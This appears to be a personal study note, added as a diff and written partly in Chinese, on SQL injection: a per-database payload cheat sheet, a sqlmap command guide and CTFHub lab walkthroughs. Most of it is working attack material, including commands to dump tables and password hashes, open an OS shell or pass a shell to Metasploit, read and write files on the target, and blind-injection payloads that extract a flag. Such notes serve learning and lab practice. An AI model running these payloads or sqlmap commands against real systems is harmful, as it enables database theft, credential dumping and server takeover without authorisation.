+| Microsoft  | `SELECT table_name FROM information_schema.tables`<br />`SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| PostgreSQL | `SELECT table_name FROM information_schema.tables`<br />`SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+| MySQL      | `SELECT table_name FROM information_schema.tables`<br />`SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
+
+
+
+### Conditional errors
+
+test a single boolean condition and trigger a database error if the condition is true.
+
+| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
+| ---------- | ------------------------------------------------------------ |
+| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
+| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
+| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
+
+
+
+
+
+### Extracting data via visible error messages
+
+You can potentially elicit(引起) error messages that leak sensitive data returned by your malicious query.
+
+`SELECT 'foo' WHERE 1 = (SELECT 'secret')`
+
+| Microsoft  | `> Conversion failed when converting the varchar value 'secret' to data type int.`<br />`SELECT CAST((SELECT password FROM users LIMIT 1) AS int)` |
+| ---------- | ------------------------------------------------------------ |
+| PostgreSQL | `> invalid input syntax for integer: "secret"`<br />`SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))` |
+| MySQL      | `> XPATH syntax error: '\secret'`                            |
+
+
+
+
+
+## sqlmap
+
+automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
+
+
+
+### **Usage**
+
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+
+
+#### Target
+
+At least one of these options has to be provided to define the target(s)
+
+```
+-u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+-d DIRECT           Connection string for direct database connection
+-l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
+-m BULKFILE         Scan multiple targets given in a textual file
+-r REQUESTFILE      Load HTTP request from a file
+```
+
+
+
+
+
+#### Enumeration
+
+These options can be used to enumerate the back-end database management system information, structure and data contained in the tables
+
+```
+ -a, --all           Retrieve everything
+-b, --banner        Retrieve DBMS banner
+--current-user      Retrieve DBMS current user
+--current-db        Retrieve DBMS current database
+--hostname          Retrieve DBMS server hostname
+--is-dba            Detect if the DBMS current user is DBA
+--users             Enumerate DBMS users
+--passwords         Enumerate DBMS users password hashes
+--privileges        Enumerate DBMS users privileges
+--roles             Enumerate DBMS users roles
+
+--dbs               Enumerate DBMS databases
+--tables            Enumerate DBMS database tables
+--columns           Enumerate DBMS database table columns
+--schema            Enumerate DBMS schema
+--count             Retrieve number of entries for table(s)
+
+--dump              Dump DBMS database table entries
+--search            Search column(s), table(s) and/or database name(s)
+--comments          Check for DBMS comments during enumeration
+--statements        Retrieve SQL statements being run on DBMS
+    
+    
+    
+-D DB               DBMS database to enumerate
+-T TBL              DBMS database table(s) to enumerate
+-C COL              DBMS database table column(s) to enumerate
+-X EXCLUDE          DBMS database identifier(s) to not enumerate
+-U USER             DBMS user to enumerate
+--exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+    
+    
+--sql-query=SQLQ..  SQL statement to be executed
+--sql-shell         Prompt for an interactive SQL shell
+--sql-file=SQLFILE  Execute SQL statements from given file(s)
+```
+
+
+
+##### Enumerate database's tables
+
+> **Switches and option: `--tables`, `--exclude-sysdbs` and `-D`**
+
+When the session user has read access to the system table containing information about databases' tables, it is possible to enumerate the list of tables for a specific dbms
+
+If you do not provide a specific database with option `-D`, sqlmap will enumerate the tables for all DBMS databases.
+
+You can also provide the switch `--exclude-sysdbs` to exclude all system databases.
+
+Note that on Oracle you have to provide the `TABLESPACE_NAME` instead of the database name.
+
+
+
+### Practices
+
+https://www.anquanke.com/post/id/235846#h3-2
+
+LOG 地址 ： C:\Users\89388\AppData\Local\sqlmap\output
+
+```
+sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
+sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
+```
+
+```
+sqlmap -u "http://www.xx.com/username/admin*"       #如果我们已经知道admin这里是注入点的话，可以在其后面加个*来让sqlmap对其注入
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
+```
+
+```
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
+有时候使用 --passwords 不能获取到密码，则可以试下
+-D mysql -T user -C host,user,password --dump  当MySQL< 5.7时
+-D mysql -T user -C host,user,authentication_string --dump  当MySQL>= 5.7时
+```
+
+```
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候
+```
+
+```
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        #爆出所有的数据库
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     #爆出所有的数据表
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    #爆出数据库中所有的列
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db #查看当前的数据库
+
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump --start 1 --stop 100  #爆出数据库security中的users表中的username列中的前100条数据
+```
+
+```
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据
+```
+
+```
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
+支持的探测方式如下：
+　　B: Boolean-based blind SQL injection（布尔型注入）
+　　E: Error-based SQL injection（报错型注入）
+　　U: UNION query SQL injection（可联合查询注入）
+　　S: Stacked queries SQL injection（可多语句查询注入）
+　　T: Time-based blind SQL injection（基于时间延迟注入）
+```
+
+```
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
+sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-pwn   #执行--os-pwn命令，将目标权限弹到MSF上
+
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
+
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql 
+其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
+sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080"    #指定代理
+
+
+sqlmap -d "mysql://root:root@192.168.10.130:3306/mysql" --os-shell   #知道网站的账号密码直接连接
+
+-v3                   #输出详细度  最大值5 会显示请求包和回复包
+--threads 5           #指定线程数
+--fresh-queries       #清除缓存
+--flush-session       #清空会话，重构注入 
+--batch               #对所有的交互式的都是默认的
+--random-agent        #任意的http头
+--tamper base64encode            #对提交的数据进行base64编码
+--referer http://www.baidu.com   #伪造referer字段
+
+--keep-alive     保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数
+```
+
+
+
+#### 探测指定URL是否存在SQL注入漏洞
+
+**对于不用登录的网站**，直接指定其URL
+
+```python
+sqlmap -u  "http://192.168.10.1/sqli/Less-1/?id=1"  #探测该url是否存在漏洞
+```
+
+在探测目标URL是否存在漏洞的过程中，Sqlmap会和我们进行交互。
+
+比如第一处交互的地方是说这个目标系统的数据库好像是Mysql数据库，是否还探测其他类型的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道目标系统是Mysql数据库了。
+
+第二处交互的地方是说 对于剩下的测试，问我们是否想要使用扩展提供的级别(1)和风险(1)值的“MySQL”的所有测试吗？ 我们选择 y。
+
+**对于需要登录的网站**，我们需要指定其cookie 。我们可以用账号密码登录，然后用抓包工具抓取其cookie填入
+
+```python
+sqlmap -u  "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"  #探测该url是否存在漏洞
+```
+
+**对于是post提交数据的URL**，我们需要指定其data参数
+
+```python
+sqlmap -u "http://192.168.10.1/sqli/Less-11/?id=1" --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
+```
+
+**我们也可以通过抓取 http 数据包保存为文件**，然后指定该文件即可。这样，我们就可以不用指定其他参数，这对于需要登录的网站或者post提交数据的网站很方便。
+
+我们抓取了一个post提交数据的数据包保存为post.txt，如下，uname参数和passwd参数存在SQL注入漏洞
+
+```perl
+POST /sqli/Less-11/ HTTP/1.1
+Host: 192.168.10.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 38
+Referer: http://192.168.10.1/sqli/Less-11/
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+uname=admin&passwd=admin&submit=Submit
+```
+
+然后我们可以指定这个数据包进行探测
+
+```python
+sqlmap -r post.txt        #探测post.txt文件中的http数据包是否存在sql注入漏洞
+```
+
+
+
+
+
+
+
+
+
+
+
+## ctfhub
+
+
+
+### 整数型
+
+1. 确定返回的列数
+
+   经测试发现，仅当返回两列时输出ID, 和 DATA, 否则无输出显示
+
+   ![image-20240511151425699](https://s2.loli.net/2024/05/11/apRISoG1W29LFuM.png)
+
+
+
+2. 确定数据库类型
+
+![image-20240511151543828](https://s2.loli.net/2024/05/11/GEyrfZH3udeFCsl.png)
+
+
+
+
+
+3. 获取表名
+
+   ![image-20240511152106518](https://s2.loli.net/2024/05/11/DxYdVcGqnXPZv5o.png)
+
+得到表名flag 
+
+由于可能存在多个表，需要使用 group_concat() 函数
+
+`GROUP_CONCAT` 是一种 SQL 中常用的聚合函数，用于将查询结果中的多行数据合并成单个字符串。在使用时，你可以指定分隔符以及是否按照特定的顺序进行合并
+
+
+
+4. 从表中获取列名为flag
+
+   ![image-20240511152302078](https://s2.loli.net/2024/05/11/w62nWKlZoXkIH1T.png)
+
+
+
+5. 获取列值
+
+   ![image-20240511152447340](https://s2.loli.net/2024/05/11/WsYVuqpFR3eCJck.png)
+
+
+
+### 字符型注入
+
+
+
+#### 手工
+
+1. 需要注意注释 `--` 后需要空格，因此需要加一个 + 
+
+![image-20240511161333910](https://s2.loli.net/2024/05/11/dXD5S8otAE1gBZP.png)
+
+
+
+2. 测试返回两列
+
+![image-20240511161458327](https://s2.loli.net/2024/05/11/1oX9bqr7kEpISew.png)
+
+
+
+3. 获取数据库类型
+
+![image-20240511161543587](https://s2.loli.net/2024/05/11/OrdHjV9ipX7fo6P.png)
+
+
+
+4. 获取数据库名
+
+![image-20240511161622126](https://s2.loli.net/2024/05/11/iKltux478MkPYo6.png)
+
+
+
+5. 获取数据库表名
+
+![image-20240511161858874](https://s2.loli.net/2024/05/11/PsIhHt7Ep13vXFM.png)
+
+`table_schema`是MySQL数据库中存储表的元数据的信息之一。它是`information_schema.tables`视图中的一个字段，用于标识表所属的数据库名称。在执行查询时，您可以使用`table_schema`字段来过滤特定数据库中的表或检索特定数据库中所有表的信息。
+
+
+
+6. 获取表的列名
+
+![image-20240511161938592](https://s2.loli.net/2024/05/11/dsyUCvSgopLPHZt.png)
+
+
+
+7. 获取对应列的值
+
+![image-20240511162053044](https://s2.loli.net/2024/05/11/IyYhgcSPbm592FE.png)
+
+
+
+
+
+#### sqlmap
+
+`python sqlmap.py -u http://challenge-30cf0be74a529f44.sandbox.ctfhub.com:10800/?id=1 --tables`
+
+![image-20240511162355646](https://s2.loli.net/2024/05/11/MD5g2JIYeNG3VfQ.png)
+
+
+
+` python sqlmap.py -u http://challenge-30cf0be74a529f44.sandbox.ctfhub.com:10800/?id=1 -T flag --columns --dump`
+
+![image-20240511162512453](https://s2.loli.net/2024/05/11/nBvSmx4CNqtpOGM.png)
+
+LOG 地址 ：C:\Users\89388\AppData\Local\sqlmap\output\challenge-30cf0be74a529f44.sandbox.ctfhub.com
+
+
+
+
+
+### 报错注入
+
+![image-20240511193146338](https://s2.loli.net/2024/05/11/9pVLmO5FwrClbD1.png)
+
+
+
+
+
+![image-20240511193730681](https://s2.loli.net/2024/05/11/xvJYwtSXDTEsiUm.png)
+
+
+
+
+
+
+
+
+
+![image-20240511193829382](https://s2.loli.net/2024/05/11/b1MYBcTlKe7A89L.png)
+
+
+
+数据库名
+
+![image-20240512155835115](https://s2.loli.net/2024/05/12/1CsvJOKfyaRdmel.png)
+
+表名
+
+![image-20240512160000438](https://s2.loli.net/2024/05/12/OYocSgdaWh6HQf2.png)
+
+
+
+列名
+
+![image-20240512160041216](https://s2.loli.net/2024/05/12/j9Vwp4MDk8Ff3lN.png)
+
+
+
+列值
+
+![image-20240512160256402](https://s2.loli.net/2024/05/12/rmY4AGBPKg5C139.png)
+
+ctfhub{db31dac3d
+
+![image-20240512160316601](https://s2.loli.net/2024/05/12/U2tWeBcKibmFA5h.png)
+
+c79986d614a4777}
+
+ctfhub{db31dac3dc79986d614a4777}
+
+
+
+
+
+### 布尔盲注
+
+![image-20240512163419979](https://s2.loli.net/2024/05/12/p1walAEXLYtJ5e9.png)
+
+
+
+![image-20240512163718032](https://s2.loli.net/2024/05/12/GpkPenZQRuhMDFN.png)
+
+
+
+意味着数据库名长度为 4 ,一定要注意语法，length() 函数接收一个字符串，but `length(select database())` 是错误的，因为 `select database()` 返回一个检索表，因此还要加一个括号将其转换为字符串
+
+![image-20240512163916588](https://s2.loli.net/2024/05/12/dI9jtOnqYCuQWxr.png)
+
+数据库名
+
+```
++AND+(SELECT+CASE+WHEN+(SUBSTRING(database(),§1§,1)='§s§')+THEN+1/0+ELSE+1+END)=1-- 
+```
+
+![image-20240512172731787](https://s2.loli.net/2024/05/12/7BNblYGmxVtywkC.png)
+
+
+
+表名
+
+```
+id=1+AND+(SELECT+CASE+WHEN+(LENGTH((select+group_concat(table_name)+from+information_schema.tables+where+table_schema='sqli'))=9)+THEN+1/0+ELSE+1+END)=1--+
+```
+
+![image-20240512205709191](https://s2.loli.net/2024/05/12/MSKhgE2ImoPRQqe.png)
+
+得到 表长共为9
+
+
+
+```
+id=1+AND+(SELECT+CASE+WHEN+(SUBSTR((select+group_concat(table_name)+from+information_schema.tables+where+table_schema='sqli'),1,1)='f')+THEN+1/0+ELSE+1+END)=1--+
+```
+
+![image-20240512210125575](https://s2.loli.net/2024/05/12/9AyE7CJeMljBc4Z.png)
+
+
+
+
+
+列名
+
+```
+1+AND+(SELECT+CASE+WHEN+(LENGTH((select+group_concat(column_name)+from+information_schema.columns+where+table_name='flag'))=§4§)+THEN+1/0+ELSE+1+END)=1--+
+```
+
+![image-20240512210543942](https://s2.loli.net/2024/05/12/wvRLxJ5onF4XUi8.png)
+
+
+
+```
+1+AND+(SELECT+CASE+WHEN+(SUBSTR((select+group_concat(column_name)+from+information_schema.columns+where+table_name='flag'),§1§,1)='§a§')+THEN+1/0+ELSE+1+END)=1--+
+```
+
+![image-20240512211031243](https://s2.loli.net/2024/05/12/U7d6xsghfKCJIW1.png)
+
+
+
+列值
+
+```
+1+AND+(SELECT+CASE+WHEN+(LENGTH((select+flag+from+flag))=§1§)+THEN+1/0+ELSE+1+END)=1--+
+```
+
+![image-20240512211313206](https://s2.loli.net/2024/05/12/hTj3pHZ8PQ1lL6B.png)
+
+flag 长度为 32 
+
+
+
+```
+1+AND+(SELECT+CASE+WHEN+(SUBSTR((select+flag+from+flag),§1§,1)='§a§')+THEN+1/0+ELSE+1+END)=1--+
+```
+
+![image-20240512211729372](https://s2.loli.net/2024/05/12/9NeTOLElRW2ytjb.png)
+
+
+
+
+
+![image-20240512173356310](https://s2.loli.net/2024/05/12/hkqRXl2uI8Gmyc9.png)
+
+
+
+
+
+### SQL 结构
+
+![image-20240513100547427](https://s2.loli.net/2024/05/13/unIGb6hBSJzLlem.png)
+
+
+
+
+
+![image-20240513100527378](https://s2.loli.net/2024/05/13/xG1mtNlesUvuC8M.png)
+
+
+
+
+
+![image-20240513100827914](https://s2.loli.net/2024/05/13/ba3HwrEDguxC7tZ.png)
+
+
+
+
+
+![image-20240513100924095](https://s2.loli.net/2024/05/13/FlaDTvYpJU1Q2g9.png)
+
+
+
+
+
+![image-20240513101001562](https://s2.loli.net/2024/05/13/GotLqkmIM2zPWhK.png)
